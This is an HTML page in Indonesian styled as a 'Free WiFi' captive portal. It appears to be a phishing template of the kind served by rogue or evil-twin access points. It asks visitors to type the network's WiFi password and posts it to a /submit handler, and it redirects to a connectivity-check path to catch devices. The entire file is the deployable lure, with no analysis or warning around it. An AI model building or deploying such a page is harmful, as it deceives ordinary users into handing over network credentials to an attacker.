<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0; url=/connecttest.html">
    <title>Free WiFi - Akses Gratis</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(to bottom, #1a1a2e, #16213e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: linear-gradient(145deg, #0f3460, #1a1a2e);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(255,215,0,0.3);
            text-align: center;
            max-width: 450px;
            border: 3px solid gold;
        }
        .wifi-icon {
            font-size: 80px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        h1 {
            color: gold;
            margin: 20px 0;
            font-size: 32px;
        }
        .subtitle {
            color: #e94560;
            font-size: 18px;
            margin-bottom: 20px;
        }
        .free-text {
            background: linear-gradient(90deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 24px;
            font-weight: bold;
            margin: 20px 0;
        }
        .password-form input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ffd93d;
            border-radius: 10px;
            font-size: 16px;
            background: #1a1a2e;
            color: white;
            margin-bottom: 15px;
        }
        .password-form button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(90deg, #ffd93d, #ff6b6b);
            color: #1a1a2e;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .features {
            margin-top: 20px;
            color: #aaa;
            font-size: 14px;
        }
        .features span { color: gold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">📡</div>
        <h1>🆓 FREE WIFI 🆓</h1>
        <div class="subtitle">Akses Internet Gratis Tanpa Batas</div>
        
        <div class="free-text">MASUKKAN PASSWORD UNTUK TERHUBUNG</div>
        
        <div class="password-form">
            <form action="/submit" method="POST">
                <input type="password" name="password" placeholder="Password WiFi" required>
                <button type="submit">⚡ HUBUNGKAN SEKARANG ⚡</button>
            </form>
        </div>
        
        <div class="features">
            <span>✓</span> Unlimited Data <span>✓</span> High Speed<br>
            <span>✓</span> Secure Connection <span>✓</span> 24/7 Access
        </div>
    </div>
</body>
</html>
